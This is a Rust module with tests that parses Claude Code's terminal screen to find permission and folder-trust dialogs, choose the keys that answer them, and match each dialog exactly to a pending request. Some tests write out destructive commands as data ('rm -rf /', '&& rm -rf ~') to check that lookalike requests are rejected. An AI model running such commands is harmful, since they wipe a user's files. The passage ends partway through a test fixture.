//! Reading Claude Code's TUI (2.1.285) off the emulated screen. Used ONLY for UI actions
//! (which key answers this dialog, is a dialog in the way of typed text, is the trust
//! prompt up, is the input box there). Status never comes from here: it comes from hooks
//! and the transcript (`mirante_core::status`). Dialog matching ported from
//! `spike_kit::screen`, whose fixtures are real 2.1.285 grids.
//!
//! Live dialogs sit at the bottom of the screen and end with a key-hint footer ("Esc to
//! cancel", "Enter to confirm · Esc to exit") in the last [`FOOTER_ROWS`] non-blank rows.
//! Only the last [`BOTTOM_ROWS`] non-blank rows are searched for the dialog, so the same
//! words in the conversation above (a quoted dialog, prose asking "Do you want to …?")
//! never count as a dialog.

use std::path::Path;

/// How many non-blank rows at the bottom of the screen a live dialog can occupy.
pub const BOTTOM_ROWS: usize = 20;
/// The key-hint footer of a live dialog is one of the last this many non-blank rows (a
/// status line may sit below it).
pub const FOOTER_ROWS: usize = 2;
/// How far above its question a dialog's tool box may start (a long, wrapped command).
const BOX_ROWS: usize = 40;

/// How many wrapped continuation lines a dialog's "Tip:" line may have.
const TIP_WRAP: usize = 3;

/// Cursor glyphs Claude Code draws on the selected option (and on the input prompt).
const CURSORS: [char; 3] = ['❯', '›', '>'];

fn non_blank(grid: &str) -> Vec<&str> {
    grid.lines().filter(|l| !l.trim().is_empty()).collect()
}

/// The last [`BOTTOM_ROWS`] non-blank lines of the screen.
fn bottom(grid: &str) -> Vec<&str> {
    let lines = non_blank(grid);
    lines[lines.len().saturating_sub(BOTTOM_ROWS)..].to_vec()
}

fn is_footer(l: &str) -> bool {
    l.contains("Esc to")
}

/// The index of the last line matching `pred` among the last [`FOOTER_ROWS`] lines.
fn footer_at_bottom(lines: &[&str], pred: impl Fn(&str) -> bool) -> Option<usize> {
    let from = lines.len().saturating_sub(FOOTER_ROWS);
    (from..lines.len()).rev().find(|&i| pred(lines[i]))
}

/// `(digit, label)` of a numbered option line (`❯ 1. Yes`, `  2. No`).
fn option(l: &str) -> Option<(char, &str)> {
    let t = l.trim().trim_start_matches(CURSORS).trim();
    let (num, rest) = t.split_once(". ")?;
    let digit = num.parse::<u8>().ok().filter(|d| (1..10).contains(d))?;
    Some((char::from(b'0' + digit), rest.trim()))
}

fn starts_with_cursor(l: &str) -> bool {
    l.trim_start().starts_with(CURSORS)
}

fn is_question(l: &str) -> bool {
    let t = l.trim();
    t.starts_with("Do you want to") && t.ends_with('?')
}

/// A drawn box border: a row of `─` (Claude Code draws one above a dialog's tool box and
/// around the input box; real 2.1.285 grids in `docs/spikes/raw/s3-status-check.md`).
fn is_border(l: &str) -> bool {
    let t = l.trim();
    t.chars().count() >= 3 && t.chars().all(|c| c == '─')
}

/// Glyphs of the box border Claude Code draws above a dialog's tool box (a plain `─` row
/// in 2.1.285; rounded corners accepted).
const BOX_GLYPHS: [char; 5] = ['─', '╭', '╰', '╮', '╯'];
/// A real box border spans at least this share (percent) of the grid's width.
const BORDER_SHARE: usize = 80;

/// The grid's width as far as the text shows: its widest row (rows never exceed the
/// terminal's width, and the real border spans all of it).
fn width(lines: &[&str]) -> usize {
    lines.iter().map(|l| l.trim_end().chars().count()).max().unwrap_or(0)
}

/// Claude Code's own box border, as in the real 2.1.285 grid (`docs/spikes/raw/
/// s3-status-check.md`): starts at column 0 (text inside a box is always indented), only
/// box glyphs, and at least [`BORDER_SHARE`]% of the grid's `width`. A `───` a command
/// prints, or draws inside the box, is never one.
fn is_box_top(l: &str, width: usize) -> bool {
    let t = l.trim_end();
    let n = t.chars().count();
    n > 0
        && !t.starts_with(char::is_whitespace)
        && t.chars().all(|c| BOX_GLYPHS.contains(&c))
        && n * 100 >= width * BORDER_SHARE
}

/// The input prompt (a cursor line that is not a numbered option, nor a trust option).
fn is_input_prompt(l: &str) -> bool {
    starts_with_cursor(l) && option(l).is_none() && trust_option(l).is_none()
}

/// In the bottom rows: the index of the last permission-dialog header (`Do you want to …?`)
/// that is followed by a `1.` option and then a footer at the very bottom, with nothing
/// between the header and the footer that belongs outside a dialog (an input prompt or a
/// box border): a dialog quoted in the conversation above the input box, with an
/// "Esc to …" status line below, is not a live dialog.
fn dialog_start(lines: &[&str]) -> Option<usize> {
    let footer = footer_at_bottom(lines, is_footer)?;
    (0..footer).rev().find(|&i| {
        let below = &lines[i + 1..footer];
        is_question(lines[i])
            && below.iter().any(|l| option(l).is_some_and(|(d, _)| d == '1'))
            && !below.iter().any(|l| is_input_prompt(l) || is_border(l))
    })
}

/// A permission dialog is open at the bottom of the screen.
pub fn has_permission_prompt(grid: &str) -> bool {
    dialog_start(&bottom(grid)).is_some()
}

/// Any selection dialog at the bottom of the screen: an option list with the cursor on an
/// option (`❯ N.`) and a footer at the very bottom. Covers dialogs Mirante does not know
/// (plan approval, model pickers): typed text must never land in one.
pub fn has_any_dialog(grid: &str) -> bool {
    let lines = bottom(grid);
    let Some(footer) = footer_at_bottom(&lines, |l| is_footer(l) || l.contains("Enter to confirm")) else {
        return false;
    };
    lines[..footer].iter().any(|l| starts_with_cursor(l) && option(l).is_some())
}

/// The digit of the live permission dialog's option whose label is exactly `label`
/// ("Yes" / "No"). Only options below the dialog header and above its footer count, and
/// only an exact label matches, so "Yes, and always allow …" and "Yes, and switch to auto
/// mode …" are never chosen (FINDINGS rule 6).
pub fn option_key(grid: &str, label: &str) -> Option<char> {
    let lines = bottom(grid);
    let start = dialog_start(&lines)?;
    let footer = footer_at_bottom(&lines, is_footer)?;
    lines[start + 1..footer].iter().find_map(|l| option(l).filter(|(_, t)| *t == label).map(|(d, _)| d))
}

pub const TRUST_YES: &str = "Yes, I trust this folder";
pub const TRUST_NO: &str = "No, exit";

/// The key that moves the trust dialog toward "Yes, I trust this folder".
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TrustKey {
    /// A numbered dialog: the digit of the exact option (accepted without Enter).
    Digit(char),
    /// The real 2.1.285 dialog (no digits): the cursor is on "No, exit", right above the
    /// "Yes" option. Down moves it to "Yes".
    Down,
    /// The real 2.1.285 dialog with the cursor on "Yes, I trust this folder": Enter accepts.
    Enter,
}

/// `(cursor on it, label)` of an unnumbered trust option line.
fn trust_option(l: &str) -> Option<(bool, &str)> {
    let label = l.trim().trim_start_matches(CURSORS).trim();
    (label == TRUST_YES || label == TRUST_NO).then_some((starts_with_cursor(l), label))
}

/// The key toward "Yes, I trust this folder" when the trust dialog is live: that option
/// and a key-hint footer below it at the very bottom. Numbered: its digit. Unnumbered (the
/// real 2.1.285 dialog): "No, exit" right above "Yes", "Yes" right above the footer, and
/// the cursor on one of them (Down from "No", Enter on "Yes").
pub fn trust_key(grid: &str) -> Option<TrustKey> {
    let lines = bottom(grid);
    let footer = footer_at_bottom(&lines, |l| is_footer(l) || l.contains("Enter to confirm"))?;
    if let Some(d) =
        lines[..footer].iter().rev().find_map(|l| option(l).filter(|(_, t)| *t == TRUST_YES).map(|(d, _)| d))
    {
        return Some(TrustKey::Digit(d));
    }
    let (yes, no) = (footer.checked_sub(1)?, footer.checked_sub(2)?);
    match (trust_option(lines[no])?, trust_option(lines[yes])?) {
        ((false, TRUST_NO), (true, TRUST_YES)) => Some(TrustKey::Enter),
        ((true, TRUST_NO), (false, TRUST_YES)) => Some(TrustKey::Down),
        _ => None,
    }
}

/// Claude's workspace-trust dialog (new folder) is live. Its default option is "No, exit".
pub fn is_trust_dialog(grid: &str) -> bool {
    trust_key(grid).is_some()
}

/// Typed text would land in a dialog (permission, trust, or any other selection).
pub fn dialog_open(grid: &str) -> bool {
    has_permission_prompt(grid) || is_trust_dialog(grid) || has_any_dialog(grid)
}

/// The input box is on screen: a `❯` / `›` / `>` prompt line in the bottom rows that is not
/// a dialog option.
pub fn has_input_prompt(grid: &str) -> bool {
    bottom(grid).iter().any(|l| is_input_prompt(l))
}

/// The ready fast path: Mirante launches with `--permission-mode manual`, whose footer
/// reads "manual mode on".
pub fn has_manual_mode_footer(grid: &str) -> bool {
    bottom(grid).iter().any(|l| l.contains("manual mode on"))
}

/// The titles Claude Code (2.1.285) puts on the tool box of a permission dialog, per tool.
/// "Bash command", "Edit file", and Write's "Create file" (new file) / "Overwrite file"
/// (existing file) are from real grids (Task 21 live run); the others are unconfirmed. A
/// tool not listed here is never matched (answer it in attach). A side agent's dialog
/// adds " · from the <type> agent" to the title, so it is never matched either.
/// Each title belongs to one tool only: `Write` never gets "Edit file" (a Write card must
/// not answer an Edit dialog of the same path).
fn titles(tool: &str) -> &'static [&'static str] {
    match tool {
        "Bash" => &["Bash command"],
        "Edit" | "MultiEdit" => &["Edit file"],
        "Write" => &["Create file", "Overwrite file"],
        "NotebookEdit" => &["Edit notebook"],
        "Read" => &["Read file"],
        "WebFetch" => &["Fetch"],
        _ => &[],
    }
}

const ALL_TITLES: [&str; 7] =
    ["Bash command", "Edit file", "Create file", "Overwrite file", "Edit notebook", "Read file", "Fetch"];

/// Glyphs that start conversation lines (Claude's messages, tool results, the turn summary)
/// or a prompt / option: never a line of a dialog's tool box.
const CHROME: [char; 5] = ['⏺', '⎿', '✻', '❯', '›'];

/// Leading spaces.
fn indent(l: &str) -> usize {
    l.len() - l.trim_start_matches(' ').len()
}

/// What the dialog box shows for `detail`: an absolute path inside the worktree is shown
/// relative to it (the whole relative path, never just the file name); anything else as is.
fn shown_detail(detail: &str, worktree: Option<&Path>) -> String {
    if let (true, Some(wt)) = (detail.starts_with('/'), worktree) {
        let canonical = std::fs::canonicalize(wt).ok();
        for root in std::iter::once(wt).chain(canonical.as_deref()) {
            if let Ok(rel) = Path::new(detail).strip_prefix(root) {
                if !rel.as_os_str().is_empty() {
                    return rel.to_string_lossy().into_owned();
                }
            }
        }
    }
    detail.to_string()
}

/// One screen line against `card` from `pos`: every character must be the card's next one,
/// and a run of spaces must be a run of whitespace in the card (the same length when the
/// card's run is only spaces; never a newline). Where the card is then, or `None`.
fn walk_line(line: &[char], card: &[char], mut pos: usize) -> Option<usize> {
    let mut i = 0;
    while i < line.len() {
        if line[i] == ' ' {
            let run = line[i..].iter().take_while(|c| **c == ' ').count();
            let crun = card[pos..].iter().take_while(|c| c.is_whitespace() && **c != '\n').count();
            if crun == 0 || (card[pos..pos + crun].iter().all(|c| *c == ' ') && crun != run) {
                return None;
            }
            i += run;
            pos += crun;
        } else {
            if card.get(pos) != Some(&line[i]) {
                return None;
            }
            i += 1;
            pos += 1;
        }
    }
    Some(pos)
}

/// The screen lines show exactly `card`, character by character (see [`walk_line`]). At a
/// screen line break the card may have a newline (consumed: a newline in the card must
/// fall on a line break), one whitespace character the wrap took (consumed or not), or
/// nothing (a wrap inside a word). The card must end exactly at the end of the last line.
fn walk(lines: &[Vec<char>], card: &[char]) -> bool {
    let mut starts = vec![0usize];
    for (li, line) in lines.iter().enumerate() {
        let last = li + 1 == lines.len();
        let mut next = Vec::new();
        for &s in &starts {
            let Some(p) = walk_line(line, card, s) else {
                continue;
            };
            if last {
                if p == card.len() {
                    return true;
                }
                continue;
            }
            match card.get(p) {
                None => {}
                Some('\n') => next.push(p + 1),
                Some(c) if c.is_whitespace() => next.extend([p + 1, p]),
                Some(_) => next.push(p),
            }
        }
        next.sort_unstable();
        next.dedup();
        if next.is_empty() && !last {
            return false;
        }
        starts = next;
    }
    false
}

/// Is the dialog on screen exactly the one for this request (`tool`, its `detail` — a
/// command or a path — and the hook's `description`, when it had one)? All of it must hold:
/// - a permission dialog is live (question, options, footer at the very bottom, nothing of
///   the input box between them);
/// - the box: the nearest real box border above the question ([`is_box_top`]: column 0,
///   box glyphs only, at least 80% of the grid's width) is the box's top, and the title is
///   the line right below it. With no such border there is no match (no fallback). The
///   title must be one of `tool`'s titles;
/// - every line between the title and the question belongs to the box: none starts with a
///   conversation or prompt glyph (⏺ ⎿ ✻ ❯ ›), none is a border, another question or a
///   known tool-box title, and all are indented deeper than the title (except one "Tip:"
///   line right below the title, at its indentation, as Claude Code 2.1.285 draws it, with
///   up to [`TIP_WRAP`] lines it wraps onto at that indentation in a narrow terminal);
/// - those lines are, character by character (see [`walk`]), the whole detail, then exactly
///   the description when the request has one (Claude shows it below the command), else
///   nothing: a shared prefix, a longer or multi-line command, different spacing or a file
///   with the same name in another directory is another request;
/// - an empty detail never matches anything.
///
/// Screen text can never prove which request a dialog belongs to: a two-line command
/// "A\nB" with no description looks exactly like command "A" with description "B". This
/// is defence in depth only; the hub decides on the transcript and hook-loss evidence
/// first (`Hub::answer_permission`).
pub fn dialog_matches(
    grid: &str,
    tool: &str,
    detail: &str,
    description: Option<&str>,
    worktree: Option<&Path>,
) -> bool {
    let needle: Vec<char> = shown_detail(detail.trim(), worktree).chars().collect();
    if needle.is_empty() || titles(tool).is_empty() {
        return false;
    }
    let all = non_blank(grid);
    let offset = all.len().saturating_sub(BOTTOM_ROWS);
    let Some(question) = dialog_start(&all[offset..]).map(|i| i + offset) else {
        return false;
    };
    let w = width(&all);
    let from = question.saturating_sub(BOX_ROWS);
    let Some(border) = (from..question).rev().find(|&i| is_box_top(all[i], w)) else {
        return false;
    };
    let title = border + 1;
    if title >= question || !titles(tool).contains(&all[title].trim()) {
        return false;
    }
    let ti = indent(all[title]);
    let mut body = &all[title + 1..question];
    let marker = |l: &&str| {
        is_question(l) || is_border(l) || ALL_TITLES.contains(&l.trim()) || l.trim_start().starts_with(CHROME)
    };
    if body.first().is_some_and(|l| indent(l) == ti && l.trim_start().starts_with("Tip:")) {
        body = &body[1..];
        // At narrow widths the Tip wraps onto lines at the same indentation (70 columns:
        // one more line, 60: still one; never more than a few).
        let wrapped = body.iter().take(TIP_WRAP).take_while(|l| indent(l) == ti && !marker(l)).count();
        body = &body[wrapped..];
    }
    let foreign = |l: &&str| marker(l) || indent(l) <= ti;
    if body.is_empty() || body.iter().any(foreign) {
        return false;
    }
    let base = body.iter().map(|l| indent(l)).min().unwrap_or(0);
    if indent(body[0]) != base {
        return false;
    }
    let lines: Vec<Vec<char>> = body.iter().map(|l| l[base..].trim_end().chars().collect()).collect();
    let desc: Option<Vec<char>> = description.map(str::trim).filter(|d| !d.is_empty()).map(|d| d.chars().collect());
    (1..=lines.len()).any(|j| {
        walk(&lines[..j], &needle)
            && match &desc {
                Some(d) => j < lines.len() && walk(&lines[j..], d),
                None => j == lines.len(),
            }
    })
}

/// Last `n` non-blank lines.
pub fn tail(grid: &str, n: usize) -> String {
    let lines: Vec<&str> = grid.lines().map(str::trim_end).filter(|l| !l.trim().is_empty()).collect();
    lines[lines.len().saturating_sub(n)..].join("\n")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    // Real grid excerpts (vt100-rendered, Claude Code 2.1.285, S3 run 1), drawn 80 columns
    // wide: the box's top border spans the whole width at column 0.
    const BORDER: &str = "────────────────────────────────────────────────────────────────────────────────";
    const DIALOG: &str = "\
❯ Use o Bash para rodar exatamente touch s3-allowed.txt e diga se deu certo.
  Creating empty file s3-allowed.txt
  ⎿  $ touch s3-allowed.txt
────────────────────────────────────────────────────────────────────────────────
 Bash command
   touch s3-allowed.txt
   Create empty file s3-allowed.txt
 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and always allow access to /home/u/s3 from this project
   3. Yes, and switch to auto mode · auto mode handles these prompts for you
   4. No
 Esc to cancel · Tab to amend";
    const DIALOG_DESC: &str = "Create empty file s3-allowed.txt";
    /// The same dialog as drawn in full (S3 run 1, `docs/spikes/raw/s3-status-check.md`): a
    /// `─` border above the title and a tip line right below it.
    const REAL_BOXED: &str = "\
❯ Use o Bash para rodar exatamente touch s3-allowed.txt e diga se deu certo.
⏺ Creating empty file s3-allowed.txt
  ⎿  $ touch s3-allowed.txt
────────────────────────────────────────────────────────────────────────────────
 Bash command
 Tip: auto mode handles these prompts for you — choose \"switch to auto mode\" below
   touch s3-allowed.txt
   Create empty file s3-allowed.txt
 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and always allow access to /Users/u/.mirante-spike/s3 from this project
   3. Yes, and switch to auto mode · auto mode handles these prompts for you
   4. No
 Esc to cancel · Tab to amend";
    const IDLE: &str = "\
❯ Use o Bash para rodar exatamente touch s3-denied.txt e diga se deu certo.
  ⎿  Interrupted · What should Claude do instead?
✻ Brewed for 1s · done 1:47 PM
❯
  ⏸ manual mode on · ← for agents";
    const EDIT_DIALOG: &str = "\
────────────────────────────────────────────────────────────────────────────────
 Edit file
   src/main.rs
 Do you want to make this edit to main.rs?
 ❯ 1. Yes
   2. Yes, allow all edits during this session
   3. No
 Esc to cancel";
    const TRUST: &str = "\
 Do you trust the files in this folder?
 /Users/u/.mirante/worktrees/app/feat
 ❯ 1. No, exit
   2. Yes, I trust this folder
 Enter to confirm · Esc to exit";
    const PLAN: &str = "\
 Would you like to proceed?
 ❯ 1. Yes, and auto-accept edits
   2. Yes, and manually approve edits
   3. No, keep planning
 ctrl-g to edit in editor · Esc to cancel";

    #[test]
    fn exact_one_time_options_only() {
        assert_eq!(option_key(DIALOG, "Yes"), Some('1'));
        assert_eq!(option_key(DIALOG, "No"), Some('4'));
        assert_eq!(option_key(EDIT_DIALOG, "No"), Some('3'));
        assert_eq!(option_key(IDLE, "Yes"), None);
    }

    #[test]
    fn lookalike_options_above_the_dialog_are_ignored() {
        let screen = format!("1. Yes\n4. No\n{EDIT_DIALOG}");
        assert_eq!(option_key(&screen, "No"), Some('3'));
        assert_eq!(option_key("1. Yes\n4. No\nno dialog here", "Yes"), None);
    }

    #[test]
    fn dialogs_need_a_footer_in_the_bottom_rows() {
        assert!(has_permission_prompt(DIALOG) && has_permission_prompt(EDIT_DIALOG));
        assert!(!has_permission_prompt(IDLE));
        // Prose that asks the same question is not a dialog: no footer.
        assert!(!has_permission_prompt("Do you want to proceed?\n1. Yes\n2. No\n❯ "));
        // A real dialog scrolled up above the bottom rows is history, not a live dialog.
        let scrolled = format!("{DIALOG}\n{}❯\n  ⏸ manual mode on", "output line\n".repeat(BOTTOM_ROWS));
        assert!(!has_permission_prompt(&scrolled) && !dialog_open(&scrolled));
    }

    #[test]
    fn the_trust_dialog_is_the_exact_option_with_a_footer() {
        assert!(is_trust_dialog(TRUST));
        assert_eq!(trust_key(TRUST), Some(TrustKey::Digit('2')));
        assert!(dialog_open(TRUST));
        // The question quoted in the conversation is not the dialog.
        let prose = "❯ Do you trust the files in this folder? asked the README\n  Yes, I trust this folder\n❯ \n  ⏸ manual mode on";
        assert!(!is_trust_dialog(prose));
        // Without a footer below the option there is no live dialog.
        assert!(!is_trust_dialog(" ❯ 1. No, exit\n   2. Yes, I trust this folder"));
    }

    /// The real trust dialog of Claude Code 2.1.285 (Task 21 live run, 120 columns): its
    /// options carry no digits, "No, exit" comes first and holds the cursor, and a digit
    /// typed into it does nothing. Only Down then Enter accepts it.
    const REAL_TRUST: &str = "\
────────────────────────────────────────────────────────────────────────────────
 Accessing workspace:

 /Users/u/.mirante/worktrees/app/feat

 Quick safety check: Is this a project you created or one you trust? (Like your own code, a well-known open source
 project, or work from your team). If not, take a moment to review what's in this folder first.

 Claude Code'll be able to read, edit, and execute files here.

 Security guide

 ❯ No, exit
   Yes, I trust this folder

 Enter to confirm · Esc to cancel
";
    const REAL_TRUST_ON_YES: &str = "\
 Claude Code'll be able to read, edit, and execute files here.

 Security guide

   No, exit
 ❯ Yes, I trust this folder

 Enter to confirm · Esc to cancel
";

    #[test]
    fn the_real_unnumbered_trust_dialog_is_found_and_answered_by_moving_the_cursor() {
        assert!(is_trust_dialog(REAL_TRUST) && dialog_open(REAL_TRUST));
        assert_eq!(trust_key(REAL_TRUST), Some(TrustKey::Down));
        assert!(is_trust_dialog(REAL_TRUST_ON_YES));
        assert_eq!(trust_key(REAL_TRUST_ON_YES), Some(TrustKey::Enter));
        assert_eq!(trust_key(TRUST), Some(TrustKey::Digit('2')));
        // Its options are not an input prompt.
        assert!(!has_input_prompt(REAL_TRUST) && !has_input_prompt(REAL_TRUST_ON_YES));
        // Without the footer right below, or with the options apart, there is no dialog.
        assert!(!is_trust_dialog(" ❯ No, exit\n   Yes, I trust this folder\n❯ \n  ⏸ manual mode on"));
        assert!(!is_trust_dialog(" ❯ No, exit\n   something else\n   Yes, I trust this folder\n Enter to confirm"));
        assert!(!is_trust_dialog("   Yes, I trust this folder\n Enter to confirm · Esc to cancel"));
        // Neither option selected: nothing to type.
        assert_eq!(trust_key("   No, exit\n   Yes, I trust this folder\n Enter to confirm · Esc to cancel"), None);
    }

    #[test]
    fn plan_approval_has_no_plain_yes_but_still_blocks_typing() {
        assert_eq!(option_key(PLAN, "Yes"), None);
        assert!(!has_permission_prompt(PLAN));
        assert!(has_any_dialog(PLAN) && dialog_open(PLAN));
    }

    /// Real Write dialog (Task 21 live run, 2.1.285): the path sits at the title's
    /// indentation and a dashed preview box follows, so the box rule never matches it
    /// (safe: Write and Edit cards are answered in `mirante attach`).
    const REAL_WRITE: &str = "\
⏺ Write(novo.txt)
────────────────────────────────────────────────────────────────────────────────
 Create file
 novo.txt
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
  1 x
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
 Do you want to create novo.txt?
 ❯ 1. Yes
   2. Yes, and switch to accept edits (auto-approve file edits and common file commands) for this session (shift+tab)
   3. No

 Esc to cancel · Tab to amend";

    #[test]
    fn write_titles_are_the_real_ones_and_the_real_write_box_is_never_matched() {
        assert_eq!(titles("Write"), &["Create file", "Overwrite file"]);
        assert!(!titles("Write").contains(&"Edit file") && !titles("Edit").contains(&"Overwrite file"));
        assert!(has_permission_prompt(REAL_WRITE));
        assert_eq!(option_key(REAL_WRITE, "No"), Some('3'));
        assert!(!dialog_matches(REAL_WRITE, "Write", "/w/novo.txt", None, Some(Path::new("/w"))));
    }

    #[test]
    fn the_input_prompt_and_the_ready_fast_path() {
        assert!(has_input_prompt(IDLE) && has_manual_mode_footer(IDLE));
        assert!(!dialog_open(IDLE));
        assert!(has_input_prompt("> \n"));
        assert!(!has_input_prompt(" ❯ 1. Yes\n Esc to cancel"));
        assert!(!has_manual_mode_footer(TRUST));
    }

    const WT_DIR: &str = "/Users/u/.mirante/worktrees/app/feat";

    #[test]
    fn dialog_matches_the_request_detail() {
        assert!(dialog_matches(DIALOG, "Bash", "touch s3-allowed.txt", Some(DIALOG_DESC), None));
        assert!(!dialog_matches(DIALOG, "Bash", "rm -rf /", Some(DIALOG_DESC), None));
        assert!(dialog_matches(
            EDIT_DIALOG,
            "Edit",
            "/Users/u/.mirante/worktrees/app/feat/src/main.rs",
            None,
            Some(Path::new(WT_DIR))
        ));
        assert!(!dialog_matches(IDLE, "Bash", "touch s3-denied.txt", None, None));
        let wrapped = format!("{BORDER}\n Bash command\n   cargo test --workspace --all-\n   features -- --nocapture\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n Esc to cancel");
        assert!(dialog_matches(&wrapped, "Bash", "cargo test --workspace --all-features -- --nocapture", None, None));
    }

    #[test]
    fn a_command_sharing_a_long_prefix_is_another_request() {
        let shown = boxed("   cargo test --workspace --all-features -- --nocapture && rm -rf ~\n   Run tests");
        // The first 30+ characters are the same: still not this request.
        assert!(!dialog_matches(
            &shown,
            "Bash",
            "cargo test --workspace --all-features -- --nocapture",
            Some("Run tests"),
            None
        ));
        assert!(
            !dialog_matches(DIALOG, "Bash", "touch s3", Some(DIALOG_DESC), None),
            "a prefix of the command is not the command"
        );
    }

    #[test]
    fn the_same_file_name_in_another_directory_is_another_request() {
        assert!(!dialog_matches(
            EDIT_DIALOG,
            "Edit",
            "/Users/u/.mirante/worktrees/app/feat/tests/main.rs",
            None,
            Some(Path::new(WT_DIR))
        ));
        assert!(!dialog_matches(
            EDIT_DIALOG,
            "Edit",
            "/Users/u/.mirante/worktrees/app/feat/main.rs",
            None,
            Some(Path::new(WT_DIR))
        ));
        assert!(!dialog_matches(EDIT_DIALOG, "Edit", "/elsewhere/src/main.rs", None, Some(Path::new(WT_DIR))));
        // Relative paths are compared as they are.
        assert!(dialog_matches(EDIT_DIALOG, "Edit", "src/main.rs", None, Some(Path::new(WT_DIR))));
    }

    #[test]
    fn an_empty_detail_never_matches() {
        assert!(!dialog_matches(DIALOG, "Bash", "", None, None));
        assert!(!dialog_matches(DIALOG, "Bash", " \n ", None, None));
    }

    #[test]
    fn the_dialog_title_must_be_the_requests_tool() {
        assert!(!dialog_matches(DIALOG, "Edit", "touch s3-allowed.txt", Some(DIALOG_DESC), None));
        assert!(!dialog_matches(EDIT_DIALOG, "Bash", "src/main.rs", None, Some(Path::new(WT_DIR))));
        assert!(
            !dialog_matches(DIALOG, "mcp__srv__run", "touch s3-allowed.txt", None, None),
            "unknown tools never match"
        );
    }

    #[test]
    fn a_stale_card_never_matches_the_dialog_shown_now() {
        // Card A ("touch a") is still pending in the hub while Claude shows dialog B.
        let b = format!("⏺ Bash(touch a)\n  ⎿  done\n{}", boxed("   touch b\n   Create b"));
        assert!(!dialog_matches(&b, "Bash", "touch a", None, None));
        assert!(!dialog_matches(&b, "Bash", "touch a", Some("Create b"), None));
        assert!(dialog_matches(&b, "Bash", "touch b", Some("Create b"), None));
    }

    #[test]
    fn the_footer_must_be_at_the_very_bottom() {
        // A dialog quoted in the conversation, with live output and the prompt below it.
        let quoted = format!("{DIALOG}\n  more output\n❯ \n  ⏸ manual mode on");
        assert!(!has_permission_prompt(&quoted) && !dialog_open(&quoted));
        assert_eq!(option_key(&quoted, "Yes"), None);
        let trust = format!("{TRUST}\n❯ \n  ⏸ manual mode on");
        assert!(!is_trust_dialog(&trust));
        // One status line below the footer is still a live dialog.
        assert!(has_permission_prompt(&format!("{DIALOG}\n  ⏵⏵ status")));
    }

    #[test]
    fn other_cursor_glyphs_mark_options_too() {
        let alt = "Bash command\n  ls\nDo you want to proceed?\n› 1. Yes\n  2. No\nEsc to cancel";
        assert_eq!(option_key(alt, "Yes"), Some('1'));
        assert!(has_any_dialog(alt));
        let gt = "Would you like to proceed?\n> 1. Yes, and auto-accept edits\n  2. No\nEsc to cancel";
        assert!(has_any_dialog(gt) && dialog_open(gt));
        assert!(has_input_prompt("› \n"));
    }

    #[test]
    fn the_real_boxed_dialog_matches_with_its_border_tip_and_description() {
        assert!(dialog_matches(REAL_BOXED, "Bash", "touch s3-allowed.txt", Some(DIALOG_DESC), None));
        assert!(!dialog_matches(REAL_BOXED, "Bash", "touch s3-allowed.txt", None, None));
        assert_eq!(option_key(REAL_BOXED, "Yes"), Some('1'));
        // The title must be right below the nearest border: a title further up is not the box.
        let moved = REAL_BOXED.replace(" Bash command\n", "").replacen("────", " Bash command\n────", 1);
        assert!(!dialog_matches(&moved, "Bash", "touch s3-allowed.txt", Some(DIALOG_DESC), None));
    }

    fn boxed(body: &str) -> String {
        format!("{BORDER}\n Bash command\n{body}\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n Esc to cancel")
    }

    #[test]
    fn spacing_newlines_and_wraps_are_matched_character_by_character() {
        // Same spaces, or a run of whitespace for a run of spaces.
        assert!(dialog_matches(&boxed("   echo a  b"), "Bash", "echo a  b", None, None));
        assert!(!dialog_matches(&boxed("   echo a  b"), "Bash", "echo a b", None, None));
        assert!(dialog_matches(&boxed("   echo a    b"), "Bash", "echo a\tb", None, None));
        // A newline in the card falls on a line break, and only there.
        assert!(dialog_matches(&boxed("   cd x\n   make"), "Bash", "cd x\nmake", None, None));
        assert!(!dialog_matches(&boxed("   cd x make"), "Bash", "cd x\nmake", None, None));
        assert!(!dialog_matches(&boxed("   cd x\n   make"), "Bash", "cd x make", Some("make"), None));
        // A wrap takes one space, or none inside a word.
        assert!(dialog_matches(&boxed("   cargo test\n   --all"), "Bash", "cargo test --all", None, None));
        assert!(dialog_matches(&boxed("   cargo te\n   st"), "Bash", "cargo test", None, None));
        // The description may follow the command, never anything else.
        assert!(dialog_matches(&boxed("   ls\n   List files"), "Bash", "ls", Some("List files"), None));
        assert!(!dialog_matches(&boxed("   ls\n   List files"), "Bash", "ls", Some("List"), None));
        assert!(!dialog_matches(&boxed("   ls\n   List files"), "Bash", "ls", None, None));
        assert!(!dialog_matches(&boxed("   ls"), "Bash", "ls", Some("List files"), None));
    }

    #[test]
    fn lines_outside_the_box_end_it() {
        // Indented no deeper than the title, or a conversation glyph, inside the box.
        assert!(!dialog_matches(&boxed(" touch a"), "Bash", "touch a", None, None));
        assert!(!dialog_matches(&boxed("   touch a\n⏺ x"), "Bash", "touch a", Some("x"), None));
        assert!(!dialog_matches(&boxed("   touch a\n  ⎿  x"), "Bash", "touch a", Some("⎿  x"), None));
        // A tip line is skipped only right below the title and at its indentation.
        assert!(dialog_matches(&boxed(" Tip: t\n   touch a"), "Bash", "touch a", None, None));
        assert!(!dialog_matches(&boxed("   Tip: t\n   touch a"), "Bash", "touch a", None, None));
    }

    /// The real Bash dialog at 70 columns (Task 21 live run, 2.1.285): the Tip wraps onto a
    /// second line at the title's indentation.
    const REAL_BASH_70: &str = "\
⏺ Cria h1
  ⎿  $ touch h1.txt
──────────────────────────────────────────────────────────────────────
 Bash command
 Tip: auto mode handles these prompts for you — choose \"switch to
 auto mode\" below

   touch h1.txt
   cria h1

 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and always allow access to /Users/u/m21home/worktrees/m21-cl
      aude/c1 from this project
   3. Yes, and switch to auto mode · auto mode handles these prompts
      for you
   4. No

